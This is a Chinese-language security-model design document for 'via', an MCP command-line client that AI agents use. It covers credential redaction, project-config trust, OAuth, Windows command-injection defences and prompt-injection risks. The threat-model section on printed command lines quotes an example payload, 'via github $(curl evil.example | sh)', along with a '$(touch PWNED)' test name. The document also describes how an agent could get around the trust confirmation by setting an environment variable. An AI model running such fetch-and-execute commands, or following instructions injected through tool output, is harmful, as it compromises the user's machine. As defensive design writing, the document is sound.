# 安全模型

via 与 agent 以同一用户、在同一个 shell 环境中运行，因此**只能降低凭证意外暴露的概率，不能防止有意读取**。需要真正隔离时，用网关（如 Asterlane）把上游凭证移出本机，via 只持有网关 key。README 与面向用户的文档必须把这条边界写清楚。

## 威胁与缓解

| 风险 | 缓解措施 |
| --- | --- |
| 凭证出现在输出或日志里 | 已解析的凭证值在所有输出中精确匹配替换为 `***`；脱敏保持结构：内容里任何长度的凭证都替换，键、协议字段与 via 自己写的文字只扫描 8 个字符以上的凭证（[输出规范](output.md#脱敏的范围)）；协议消息不携带凭证。日志（[daemon.md](daemon.md#日志)）：每一行写盘前用同一个脱敏器，stdio 子进程的 stderr 按行处理（凭证切在两个数据块之间也能认出）并按内容处理（任何长度的凭证）；日志不记录参数值、调用结果、资源内容、elicitation 的问题与答案；控制字符与转义序列写成可见的转义，日志里的一行永远只是一行；日志与缓存同目录同权限（0700/0600，Windows 靠用户目录的 ACL），两周没写过的被清理 |
| agent 读取配置文件拿到凭证 | 配置只存引用；推荐 `keychain:`；`via doctor` 对明文值告警 |
| 误调用破坏性工具 | `destructiveHint` 工具需要 `--yes`；`deny` 正则规则，deny 优先 |
| 不可信仓库里的项目配置 | 项目级配置中的 stdio 命令和 HTTP 端点首次使用前需 `via trust`（默认在终端确认；`--yes` 需要显式路径加环境变量开启，agent 说明里要求不要自己运行）；`cmd:` 凭证引用只允许出现在用户配置中，信任也不能放行 |
| 其他本地用户访问 daemon | socket 权限 0600、目录 0700，CLI 连接前检查属主与权限位，握手需要 0600 令牌文件里的随机令牌（Node 取不到 `SO_PEERCRED`，用这三项代替对端 uid 校验，见 [daemon.md](daemon.md#socket-安全)）。Windows：管道名由每次启动的令牌派生，令牌文件在用户目录里（见 [daemon.md](daemon.md#windows)） |
| Windows 上经 `cmd.exe` 的命令注入（参数里的 `&`、`\|`、`%VAR%`） | 命令名只从 `PATH` 解析、不找当前目录；`.cmd` / `.bat` 的每个词放进双引号，含 `"`、`%`、换行的参数拒绝而不转义；打开浏览器不经 `cmd.exe`（见下） |
| 任务 ID 泄露 | 2026-07-28 的扩展里任务 ID 就是访问任务的凭据。via 把它写进用户缓存目录的 `tasks/<server 哈希>/`（目录 0700，文件 0600，与游标同级的私密性）；记录只含任务 ID、工具引用、时间与状态，不含参数与结果；元信息行的名称不含任务 ID；`--detach` 的输出里有它，因为那是调用方要的东西 |
| server 自述（`instructions`、`description`）里夹带指令或伪造输出 | 只在 `via <provider> -h` 显示，不进默认视图与搜索；标明来自 server、脱敏、截到 500 字符、控制字符写成可见转义、每行缩进（不能伪造 `next:`、`error:`、`·` 行）（[discovery.md](discovery.md#server-自述)） |
| 工具返回内容里夹带指令（提示注入） | via 只做格式化，不解释内容；元信息使用固定的 `·` 前缀行，避免与工具内容混淆；`via prompt` 生成的说明提醒 agent 把工具输出当作数据 |
| 粘贴 via 打印的命令行时执行了别的命令（工具名、prompt 名、参数名、枚举值、URI、用户输入里的 `$(…)`、反引号、`\`、`!`、引号、换行） | 打印出来的命令行里，不是 via 自己写的词一律经同一组引用函数（`src/render/shell.ts`）：POSIX 用单引号，Windows 用 PowerShell 与 `cmd.exe` 都认的双引号，必要时用 PowerShell 的单引号（且词里没有 `cmd.exe` 的语法字符）；没有安全写法的词（含换行与控制字符、花引号等）不进入命令行，换成 `<占位符>`；以 `-` 开头的外部值不作位置参数（会被当成 via 的选项）；回显在消息里的文字，换行与控制字符写成可见的转义。规则与不覆盖的情形（csh）见 [output.md](output.md#可粘贴的命令行) |
| 缓存中的敏感结果 | 游标与媒体文件存放在权限为 0700 的用户缓存目录，按 TTL 清理。Windows 没有这类权限位，私密性来自用户目录的默认 ACL（见下「Windows 上的文件权限」）。性能缓存（`tools/list` 的原始缓存与预构建缓存、配置的解析缓存）同在这个目录：配置解析缓存只存结构和字符串在文件里的偏移，不复制任何字符串，所以写进配置的字面量凭证不会出现在缓存目录里（[config.md](config.md#解析缓存)）；预构建缓存只含工具名、参数名、描述与检索词，和原始缓存同一类内容，不含任何凭证值（[discovery.md](discovery.md#预构建缓存)） ||
| 读取其他客户端的 token | 不读取；OAuth 由 via 自己完成并存入钥匙串（不可用时退回 0600 的私有文件，[auth.md](auth.md#存储)） |
| OAuth token 出现在输出里 | access token、refresh token、ID token 与客户端 secret 一律计入脱敏列表；授权 URL 只含 `state` 与 PKCE challenge，不含秘密；回调监听只绑 `127.0.0.1` 并校验 `Host` 与 `state`；调用过程永远不会启动授权 |
| 客户端 secret、私钥、refresh token 被发往别的授权服务器 | 这些凭据绑定到被验证时的授权服务器（`issuer`，存在 OAuth 记录里）：MCP server 事后让受保护资源元数据指向别处，via 在刷新、机器授权的令牌请求和带配置 secret 的再次登录里发现授权服务器变了，就拒绝（退出码 4，`next: via auth logout <provider>`），不向新的授权服务器发送任何凭据（SEP-2352，[auth.md](auth.md#绑定授权服务器)）。边界：首次使用即信任；存储里没有记录（全新的 CI 机器）时没有可比较的东西 |
| OAuth client credentials 的 secret 与私钥出现在输出、存储或进程列表里 | 配置里只有凭证引用，值每次用时才解析，只在内存里，计入脱敏列表（私钥是多行 PEM，整段及各行都可被替换）；保存的记录里只有令牌与授权服务器信息，没有 secret 和私钥；令牌请求放在 POST 的请求体与 `Authorization` 头里，不出现在 URL 或命令行参数里；签名断言有效期 300 秒、带 `jti`；`cmd:` 只允许出现在用户配置里（项目与框架配置里的 `auth.oauth.clientSecret`、`privateKey` 同样在加载阶段拒绝，`cmd-forbidden`） |
| 本机其他程序抢占回调端口或截获授权码 | 回调端口是固定范围（29842–29851），可以被预先占满：登录退出码 6，`next:` 建议 `--manual`，不会发出授权请求；被别的程序监听到授权码也兑换不了——PKCE 的 verifier 只在 via 进程内存里，`state` 随机且回调时校验。回调监听只绑 `127.0.0.1`，校验 `Host`，回调地址只用 IP 字面量（不依赖 DNS 解析 `localhost`） |
| CIMD 文档被替换或地址被改 | via 的 `client_id` 是托管文档的 https 地址：谁控制这个地址，谁决定授权页上显示的客户端名和允许的回调地址。授权请求里的 `redirect_uri` 由 via 自己选定（回环地址），授权服务器只会把授权码送到文档里同样列着的那个地址，所以文档被换也不会把授权码送到别处；`clientMetadataUrl` 可以设成别的地址或关闭（`false`），它和 `clientId` 一样可以写在项目级配置里，影响只限于授权页上显示的客户端名，所以不要求 `via trust`。文档与代码里的端口范围由测试核对，改文档地址等于换客户端，须同时发新版本 |
| 授权被发往仓库指定的地址 | `via auth login` 对未信任的项目级 server 退出码 5 |
| 本机目录被告知 server（roots） | 默认不声明 `roots` 能力，server 看不到任何本机目录；只有用户在配置里写下 `roots` 才声明。项目级配置设置非空 `roots` 需要 `via trust`，`via trust` 会列出；`[]` 只会收窄，不需要。给 HTTP server 配 `roots` 时告警（本地路径发往远端）。via 不会因为 server 的请求改变 roots，会话的 roots 在其生命周期内固定 |
| server 借 elicitation 向用户套取输入，或把用户引到恶意网页 | via 声明 elicitation，但只有交互终端上的人能回答；agent 经 shell、`via serve`、`via batch` 一律收到 `decline`，调用的结果里写明并给出 `next: ask the user to run this in a terminal`（退出码 5）。提示先写明提问的 provider 和「这段文字来自 server」，server 的文字脱敏后以可见的转义显示控制字符。URL 模式只打开 `http(s)`，先显示完整 URL 与主机名并等用户确认，从不自动打开；带用户名密码的 URL、其他 scheme 直接拒绝；打开命令与 OAuth 相同（Windows 不经 `cmd.exe`）。via 不声明 sampling。答案不进日志与缓存（[elicitation](#elicitation)） |
| 代理密码出现在输出里，或请求绕过代理直连 | `HTTPS_PROXY` / `HTTP_PROXY` 里的用户名和密码计入脱敏名单；`via doctor` 把 userinfo 显示为 `***@`；网络层错误信息在抛出前先抹掉 `user:pass@` 与已知的密码；代理地址不可用时请求失败（退出码 2），不退回直连；代理变量只来自环境，项目级配置无法设置，代理密码不经过 daemon 的 socket（[config.md](config.md#代理)） |
| 工具描述与查询被发往第三方 embedding 端点 | `search.semantic` 默认关闭，只在用户配置里生效（项目与框架配置里的被忽略并告警）；见下文[embedding 检索的数据外流](#embedding-检索的数据外流) |

## 打印出来的命令行

via 打印的 `next:` 提示、`-h` 的用法与示例、`via trust` 的命令行显示，都含有来自不可信一方的文字：server 的工具描述与名字、参数 schema 里的枚举值与默认值，以及用户（常常是被提示注入的 agent）输入的名字和路径。它们不能成为一条会执行的命令：

- 威胁模型：server 或一段提示注入，让 via 在输出里写出 `via github $(curl evil.example | sh)` 之类的建议，由下一步照抄的 agent 或人粘贴执行。via 不解释内容，但它自己拼的命令行是它的责任。
- 防线是单点引用（[output.md](output.md#可粘贴的命令行)）：所有外部文字经 `shellQuote`/`shellArg`/`shellWords`，不能安全引用的写成占位符而不是勉强引用，回显在消息里的文字转义换行与控制字符。工具名、资源名、动作名在拆分时已被规范成小写的字母、数字与 `-`（naming.md），所以通常本身就是安全的词；这层引用是纵深防御，也覆盖原始名（`alias:` 行）、prompt 名、归一化后同名而保留的原参数名、用户输入与路径。
- 测试：`test/render/shell.test.ts` 用真实的 `sh`/`bash`/`dash`（有则 `zsh`）粘贴引用结果，核对读回的参数与「没有任何命令被执行」；`test/cli/quoting.test.ts` 用名为 `$(touch PWNED)`、带反引号、引号、换行的工具、参数与 prompt 走完整个命令行。
- 不保证：csh、tcsh；终端对粘贴内容的预处理；从一个平台复制到另一个平台。via 只按它运行的平台引用。

## elicitation

server 在调用中途向用户提问（[ADR 0018](../adr/0018-elicitation-in-a-terminal-declined-elsewhere.md)、[output.md](output.md#server-向用户提问elicitation)）。边界：

- **谁回答**：只有终端前的人（stdin 与 stderr 都是 TTY）。agent 的 shell 调用、`via serve`、`via batch` 没有这个人，via 不替用户回答——确认类的问题由 agent 自答等于绕过确认。要预填答案属于以后的、显式开启的功能，不是默认。
- **server 的文字是不可信数据**：消息、字段标题与描述、选项、URL 都先脱敏（任何长度的凭证），再把控制字符与转义序列显示为 `\uXXXX`；提示总是写明是哪个 provider 在问、文字来自 server。表单里的 `default` 只作为预填，发送前有一步汇总确认，且没有默认的「同意」。
- **表单不是收集秘密的地方**：协议规定 server 不得用表单模式要密码、API key；via 不对字段名做猜测，但答案只发给提问的 server，不写日志、不缓存、不进 `next:`。
- **URL**：只打开 `http`/`https`，先完整显示 URL 与主机名，用户确认才打开；带用户名密码的 URL 一律拒绝；打开命令不经 shell（macOS `open`、Linux `xdg-open`、Windows `rundll32.exe` 完整路径，与 OAuth 回调共用 `openBrowser`）；不预取、不跟随。`accept` 只表示用户同意去做这件事。
- **daemon 不是终端**：daemon 把提问转给发起调用的 CLI，答案经 socket 回来，按严格的形状校验后才交给 server；连接断开、调用结束都按 `cancel`（[daemon.md](daemon.md#elicitation)）。同一会话上并发的调用无法由协议区分，提问可能出现在另一个有终端的 CLI 上，所以提示里总是写明 provider 与原文。
- **不声明 sampling**：via 不调用模型；server 的 `sampling/createMessage` 是未声明的能力。

## 项目级配置的信任

项目目录可能来自不可信的仓库，因此：

- 项目级 `.via.yaml`，以及作为来源读取的项目级框架配置（如 `.mcp.json`、`.cursor/mcp.json`、`.vscode/mcp.json`）中定义的 **stdio 命令**和 **HTTP 端点**，首次使用前必须经 `via trust` 确认。HTTP 同样需要确认，因为项目配置一旦能改 `url`，用户为这个 server 配置的凭证（`auth.bearer`、钥匙串、文件）就会被发往仓库指定的地址。
- 信任按「文件路径（符号链接解析后的真实路径）+ 内容的 SHA-256」记录在用户数据目录的 `trust.json`（目录 0700，文件 0600，原子替换）；内容变化后需要重新确认。哈希针对 via 实际解析的那份字节，读取与校验之间文件被改动不会被误信任。记录文件损坏时视为没有任何信任记录，并给出告警。Windows 上路径先规范成唯一写法再记录和比较：用 `realpath.native` 取真实路径（还原大小写、展开 8.3 短名、联接点与 `subst` 盘符），去掉 `\\?\` 与 `\\?\UNC\` 前缀，盘符大写；比较时不区分大小写（NTFS 默认不区分），所以 `c:\repo\.via.yaml`、`C:/Repo/.via.yaml` 和 `\\?\C:\REPO\.via.yaml` 是同一个文件、同一条记录。
- 项目级文件设置非空的 `roots` 同样视为决定 server 能碰什么的字段：它会把本机目录交给 server（filesystem 类 server 会把 roots 当作可访问范围），所以与 `command`、`url` 一样需要 `via trust`；用户级配置里定义的 server，如果项目配置给它加了 `roots`，视为未信任。写成 `[]` 只会收窄，不需要。
- 凡是参与决定传输的项目级文件都要已被信任：stdio 进程如何启动（`command`、`args`、`env`、`cwd`），HTTP 请求发往哪里、带什么头（`url`、`headers`）。用户级配置里定义的 server，如果项目配置给它加了 `env`、改了 `url` 或加了 `headers`，同样视为未信任；项目配置只改 `timeout`、`disabled`、`auth` 等不影响传输的字段则不需要。项目配置里 `sources` 列出的文件按项目级处理。
- 未信任时，这些 server 在视图中显示为 `untrusted`，调用退出码 5，并提示 `via trust <路径>`（同一个 server 有多个文件待确认时提示不带路径的 `via trust`）。路径含空格等字符时按 shell 规则加引号，没有安全写法的路径写成 `<path>`（[output.md](output.md#可粘贴的命令行)）。
- 项目级配置和框架配置中出现 `cmd:` 凭证引用时直接拒绝，信任也不能放行：该 server 的定义整条被忽略，并报 error 级诊断（`cmd-forbidden`）。`cmd:` 会执行命令，不属于「确认之后可以使用」的范畴；需要时在用户配置里定义，项目配置只能引用用户配置里已有的 server（改传输部分仍要信任）。
- `deny` 不受信任机制约束：项目配置只能追加规则，不能撤销用户配置的规则，详见 [config.md](config.md#deny)。

### `via trust`

```console
via trust [<路径>]               # 显示将被信任的内容，在终端里确认后记录
via trust <路径> --yes           # 脚本用：需要显式路径，并设置 VIA_ALLOW_NONINTERACTIVE_TRUST=1
via trust --list                 # 列出信任记录及其状态
via trust --revoke <路径>        # 删除一条记录
```

- **范围**：不带路径时，处理当前目录加载到的、因信任而被拦住的项目级文件（含 `.via.yaml`、`sources` 列出的项目级文件、项目级框架配置）；带路径时只处理这一个文件。路径必须是当前目录实际加载的项目级文件（相对路径相对于当前目录，符号链接按真实路径匹配），否则退出码 2；该文件里没有需要信任的 server 定义时只说明情况，不记录。信任是针对文件的，不是针对 server 的。
- **显示内容**：每个文件一段，写明文件路径、状态（`not trusted`；曾信任过但内容变了则为 `changed since it was trusted`）、哈希前 12 位，以及受它影响的每个 server 的有效传输定义：stdio 的命令行（含参数，按[可粘贴的命令行](output.md#可粘贴的命令行)的规则引用，含空白的参数加引号；含控制字符等没有安全写法的参数显示为转义字符串）、`cwd`、`env` 的变量名；HTTP 的 scheme、主机与路径（userinfo、查询串隐藏，并注明），`headers` 的头名；非空的 `roots` 照原样列出（`roots: ., ~/notes`）。`env`、`headers`、`auth` 的值只写来源：凭证引用写引用本身，字面量写 `(literal)`，不显示值；`cmd:` 只写程序名，因为参数里可能带密钥。文件内容里的控制字符、双向文本控制符按转义形式显示，避免文件伪造显示内容。命令行的参数是配置原文，会原样显示，**不要把密钥写进参数**。
- **确认**：显示之后需要明确确认才记录。默认的确认方式是终端交互：stdin 与 stderr 都是 TTY 时提示 `trust this file? [y/N]`，只有 `y`/`yes` 通过；回答 `n` 或直接回车退出码 5，什么都不记录。没有终端时退出码 5，`next:` 是 `ask the user to run this in a terminal: via trust <路径>`（提示不建议 `--yes`）。`--dry-run` 只显示、不记录，退出码 0。
- **`--yes`（给脚本用）**：不是一个单独的开关，必须同时满足两个条件，否则什么都不记录：
  1. 带显式路径，不带路径时退出码 2（`--yes needs an explicit <path>`）：脚本必须写明要信任哪个文件，不能「把当前目录里拦住的都放行」；
  2. 环境变量 `VIA_ALLOW_NONINTERACTIVE_TRUST=1`（恰好是 `1`）。没设置时退出码 5，错误信息只说 `--yes` 在用户未明确开启非交互信任时不可用，不点出变量名（变量名只写在文档和 `via trust -h` 里），`next:` 同样是请用户在终端运行。在终端里带了 `--yes` 但没有这个变量，同样拒绝，不会退回到提示。

  `--dry-run` 与 `--yes` 同用时只显示，不需要变量。这两条不能阻止一个有 shell 的 agent 自行设置变量，因为 agent 与用户本来就在同一个环境里（见顶部的边界说明）；它们的作用是让「一个 `--yes` 就放行不可信仓库」不会是顺手就发生的事：默认路径是终端确认，`next:` 提示不会把 agent 引向 `--yes`，`via prompt` 生成的说明明确要求 agent 不要自己运行 `via trust`（[agent-integration.md](../guides/agent-integration.md#via-prompt给-agent-的说明)）。在 agent 的权限设置里不放行 `via trust` 才是真正的拦截；不要在 agent 能读到的 shell 配置里全局设置这个变量。
- **记录**：写入 `trust.json` 的是 via 解析时读到的那份字节的 SHA-256（不是确认时磁盘上的内容），成功后在 stderr 输出 `· trusted <路径> · sha256 <12 位> · <provider 列表>`。文件内容之后改变则视为未信任，`via trust` 会再次显示并要求确认。
- **`--list`**：每条记录一行：状态（`trusted`、`changed`、`missing`）、路径、哈希前 12 位、日期；没有记录时输出 `no trust records`。
- **`--revoke <路径>`**：删除该路径（真实路径）的记录，stderr 输出 `· revoked <路径>`；没有记录时退出码 3，提示 `via trust --list`。撤销不需要文件仍然存在。
- 信任记录损坏时输出告警，视为没有记录；重新 `via trust` 会整个重写。
- 不读取配置里的凭证，也不连接任何 server。

### `cmd:` 凭证

- 只在用户配置（及命令行覆盖）里有效；项目配置与框架配置里的 `cmd:` 在加载阶段拒绝（见上）。解析时再次校验来源，来自项目或框架的引用即使别处已缓存了同名结果也不会拿到值。
- 命令不经 shell 执行（`shell: false`），不做变量、通配符、`~` 展开，不支持管道与重定向；需要这些时显式写 `cmd:sh -c '…'`（Windows 上写 `cmd:powershell -NoProfile -Command '…'`）。分词规则见 [config.md](config.md#凭证引用)。Windows 上批处理文件的处理见下节。
- 命令继承 via 的环境变量（凭证助手如 `op`、`pass` 依赖它们），在 via 的当前目录运行，stdin 关闭，stderr 丢弃。
- stdout 去掉首尾空白后即凭证值，**视为凭证**：只留在内存，进入脱敏列表，不写盘。stdout 与 stderr 的内容不进入任何错误信息，命令失败时也不会出现（失败的助手完全可能把密钥打印出来）；错误信息只含程序名（不含路径与参数）和原因：未找到、退出状态码、被信号终止、超时、输出为空、输出超过 64 KiB。
- 超时 30 秒（超时即强制结束命令）；输出上限 64 KiB。

## Windows 上的子进程

Node 的 `spawn` 在 Windows 上只能启动 `.exe` 和 `.com`；`npx`、`npm`、`az`、`pass` 等通常是 `.cmd` / `.bat` 垫片，必须经 `cmd.exe`，而 `cmd.exe` 会重新解析整行命令（"BatBadBut"：参数里的 `&`、`|`、`^`、`%VAR%` 被当成命令或变量）。via 的取舍：

1. **命令名只从 `PATH` 和 `PATHEXT` 解析，永远不找当前目录**。`CreateProcess`、`cmd.exe` 以及 `which` 类库在 Windows 上都先找当前目录，而 stdio server 默认在调用方的工作目录运行，那可能是一个陌生仓库：用户配置里写 `command: npx` 并不意味着愿意运行仓库里的 `npx.cmd`。`PATH` 里的相对条目同样忽略。
2. **`cmd:` 凭证命令自己实现**（`src/platform/command.ts`）：`.exe` / `.com` 以完整路径直接启动，参数按普通的 Windows 规则传递，没有 shell 参与；`.cmd` / `.bat` 以 `cmd.exe /d /v:off /s /c "<批处理> <参数…>"` 启动（`/d` 跳过 AutoRun，`/v:off` 关闭延迟变量展开，`cmd.exe` 取 `%ComSpec%`——必须是名为 `cmd.exe` 的绝对路径，否则用 `%SystemRoot%\System32\cmd.exe`），命令行已拼好，不再让 Node 二次转义。每个词（批处理路径与所有参数）都放进双引号，引号内 `& | < > ^ ( )` 都是字面字符；结尾的反斜杠加倍，以免转义收尾的引号。**含 `"`、`%`、回车换行、NUL 的参数或路径整条拒绝**，不尝试转义——`cmd.exe` 对这几个字符没有可靠的转义写法（引号会让后面的 `&` 跳出引用，`%` 无论怎么写都会被展开）。拒绝的错误信息只指出第几个参数、什么问题。
3. **stdio server 的命令**同样先由 via 解析成完整路径（规则 1），参数检查同规则 2（含这些字符就不启动），然后交给 MCP SDK 的 `cross-spawn`：它对 `.cmd` / `.bat` 用 `cmd.exe /d /s /c` 并给每个元字符前加 `^`。via 不自己拼这条命令行，是因为 SDK 的 stdio 传输把 `command` 和 `args` 交给 `cross-spawn`，换掉它就要重写整个传输；`cross-spawn` 的转义不处理 `%` 展开的所有情形，所以 via 事先拒绝这些参数。拿到完整路径后 `cross-spawn` 不会再搜索任何目录。
4. 其他扩展名（`.ps1`、`.js`、`.vbs`、`.wsf`，即使 `PATHEXT` 列了它们）不启动，错误信息说明；想运行脚本请显式写解释器（`command: node`、`args: [script.js]`；`powershell` 是 `.exe`）。
5. **打开浏览器**（`via auth login`）不用 `cmd /c start`：授权 URL 是授权服务器给的，里面的 `|`、`^`、`(` 会被 `cmd.exe` 当成命令。改为 `rundll32.exe url.dll,FileProtocolHandler <url>`（完整路径直接启动），并且只打开 `http(s)://`。
6. 强制结束进程在 Windows 上不会连带结束子进程：`cmd:` 命令超时被杀、或 stdio server 关闭时 MCP SDK 先关 stdin（正常的 server 因此退出，`cmd.exe` 随之退出），2 秒后 `TerminateProcess` 只结束 `cmd.exe`，批处理拉起的子进程（`npx` 起的 `node`）可能继续运行。`cmd:` 的 stdout 管道已被销毁，不会再有输出被读取；不响应 stdin 关闭的 stdio server 可能残留，`via daemon status` 里的 pid 是 `cmd.exe` 的。用 `.exe` 形式的命令没有这个问题。

残留风险：参数检查之外，批处理文件本身怎么使用收到的参数（例如不加引号地展开 `%1` 再交给别的命令）是它自己的事；via 保证的是 `cmd.exe` 这一层不会把参数变成命令。

## Windows 上的文件权限

via 在 POSIX 上靠文件模式（目录 0700、文件 0600）保护信任记录、OAuth 回退文件、游标、媒体与目录缓存、日志、daemon 令牌。Windows 的 `mode` 参数不起作用，`chmod` 只能切换只读标志。via 不调用 `icacls` 或 Win32 ACL API（没有原生依赖，也不想在每次写文件时起子进程），也**不宣称**这些文件是 0600：

- 这些文件都在 `%LOCALAPPDATA%\via\`（缓存与数据）下，目录从用户目录继承 ACL；标准的用户目录只授予该用户、SYSTEM 和管理员访问，其他普通用户读不到。via 依赖这一点。
- 不成立的情形：`%LOCALAPPDATA%`（或 `LOCALAPPDATA` 环境变量）被指到共享位置，或用户目录的 ACL 被放宽。via 不检查 ACL，也就无法告警；`via doctor` 目前也不探测。
- 管理员和 SYSTEM 不受任何一种保护，同 POSIX 的 root。
- 对令牌、凭证最敏感的两项（OAuth 记录、握手令牌）：OAuth 优先存 Credential Manager（受 DPAPI 保护，按用户加密）；握手令牌只在 daemon 运行期间存在，每次启动重新生成。

## embedding 检索的数据外流

可选的 `search.semantic`（[config.md](config.md#searchsemantic)）开启后，`via find` 会向用户配置的端点发送：

- 目录里每个未被 `deny` 隐藏的工具的规范名、描述（前 600 字符）和参数名——这些来自各 server 的 `tools/list`，可能包含内部系统的名称与说明；
- 每次 `find` 的查询原文（agent 写的自然语言，可能带有任务上下文）。

因此：

- **同意在用户一侧**：只读用户配置与命令行覆盖；项目配置和框架配置里的 `search.semantic` 被忽略并告警，仓库不能把这些内容引向它选定的主机。启用前应确认端点属于可信的一方，需要时用本机端点（`http://localhost…`）。
- **传输与凭证**：`url` 必须是 https（回环地址除外），不含内嵌凭证；凭证只来自 `auth` 的凭证引用，在内存中解析，随请求头发出；不跟随重定向，避免凭证随跳转发到别处；解析出的值进入脱敏列表，不出现在输出、错误信息、缓存文件里。
- **错误信息**：退回词法排序时只输出状态码或错误码（`HTTP 401`、`ECONNREFUSED`、`timeout after 3s`）和缺失的凭证引用名；不输出响应体（服务端可能回显请求）、请求头或端点。
- **缓存**：用户缓存目录下的 `embeddings/`（0700，文件 0600），只含文本哈希与向量；端点只以哈希参与文件名。向量本身可以部分反推文本，所以与目录缓存一样按用户私有数据对待。
- **范围**：只有 `via find` 使用它，其他命令不会触发请求；daemon 不参与，也不会因此保存端点凭证。请求遵守代理变量（[config.md](config.md#代理)）。

## 边界说明

- `deny` 只匹配工具引用。MCP 资源与 prompt 的列出、读取（`via resources`、`via read`、`via prompts`）协议上都是只读的，不受 `deny` 与 `--yes` 约束。一个 server 通过资源暴露的内容多少，取决于 server 本身和用户给它的 `roots`；需要整个隐藏时用 `disabled`。资源内容和 prompt 消息同工具输出一样是数据，via 不解释它们。
- `deny` 只在 via 一侧生效。agent 可以绕过 via 直接访问上游，需要不可绕过的限制时，使用上游提供的只读端点（如 Linear 的 `/mcp/readonly`）、最小权限的 token，或网关。
- via 不修改任何框架配置，也不代替框架做权限判断。
- `via serve` 不扩大能力：每个元工具调用就是一条 CLI 命令，`deny`、`--yes`、脱敏照常生效，`via trust` 与 `via auth` 没有对应的工具，参数无法变成命令行选项（[cli.md](cli.md#via-serve)）。它只在 stdio 上服务拉起它的那个进程，不监听端口，也不做调用方鉴权或审计；需要这些时仍然用网关（[ADR 0002](../adr/0002-standalone-client-not-gateway.md)）。
